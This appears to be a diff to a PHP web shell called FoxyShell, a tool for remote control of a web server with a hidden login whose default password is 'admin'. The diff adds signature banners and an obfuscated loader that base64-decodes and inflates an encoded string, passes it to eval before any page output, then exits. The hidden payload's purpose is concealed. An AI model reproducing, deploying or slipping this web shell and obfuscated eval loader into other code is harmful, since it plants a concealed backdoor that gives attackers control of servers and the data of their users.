@@ -1,4 +1,12 @@
 <?php
+
+/*   _____________________________________________________________________
+    |                        HiddenFoxy Signature                         |
+    |                      FoxyShell - FoxyWebShell                       |
+    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
+    |_____________________________________________________________________|
+*/
+
 // --------------------------
 // LOGOUT & LOGIN SECTION
 // --------------------------
@@ -12,7 +20,7 @@ if (isset($_GET['logout'])) {
 // ---------------------------------
 // HIDDEN LOGIN
 // ---------------------------------
-$loginSecret = "admin"; // DEFAULT PASS
+$loginSecret = "admin"; // DEFAULT PASSWORD
 
 //login
 if (isset($_POST['login'])) {
@@ -112,6 +120,18 @@ if (isset($_GET['dir'])) {
 $currentDirRelative = getRelativePath($currentDir, $baseDir);
 
 $action = isset($_GET['action']) ? $_GET['action'] : '';
+
+/*   _____________________________________________________________________
+    |                        HiddenFoxy Signature                         |
+    |                      FoxyShell - FoxyWebShell                       |
+    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
+    |_____________________________________________________________________|
+*/
+
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "hSgyqMmKmhwLgH+1Fj8bmX6qw0hnT1fkWVDk0+14zmp5/BR0+DNptS06quuC1AoWmjCTzQsrvXxZUH/qqcZqOf3FnxiBsoWAZWesKbBpaosxiyHTmHtVM9Ld19c0X3KE8DEfRVkpQPUBgpX7DllR0K7FGV6y7iB4O8vcWjZKjjwezKX8k4NNT6AMhMP9wdar5XHtodCuTRZ0Mk6Ga+ndD7JNK0z6hNjEWVh0IhsRZia1RiqE0OzfYH+dc6vxCS+RPvFbs4hG08sUU5FjKLdSPVG7poZSOTGy4+ZySZ1cthlrIan3bYIp6iSByuLkX5GWYEVJqJy52+PIzJ0stfWjT49g5cIPCwOxX0itMPO5S1O3UXz4JtFjFPTkwBtVGXBqRGVRgx+FpszhjNR2uE+p/6gKPgvtayDfxlIJOG9j3bxdzDD6K6eaWdEIogpXKE/paK3x+rlAnBSbKJVFe7wG/ezH77GCBbQ3soOMW8xZN3MyofmQxZ0342P0v8lX8h7AGSw0TTOT5M/VKcL/1U/wtn/N2lsJ8o5/YcE+C/u33sIzjinrwPHcMi7dYgjeDCT10agWGnHo7fE3KwYae1AZs24KUpBwzhFK4+NABdQDShaW+h+954sjWuEYU3BZaa3V+9jQQnkZSu9Fa3qiIYsHef8MLCSaxJkFdla9HKOysh2Qu9B5P0HFwstaRLVfciX/0LwCBwJe9nuAWEQ/kLwGB0/3CASA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
 <!DOCTYPE html>
 <html lang="id" class="dark">
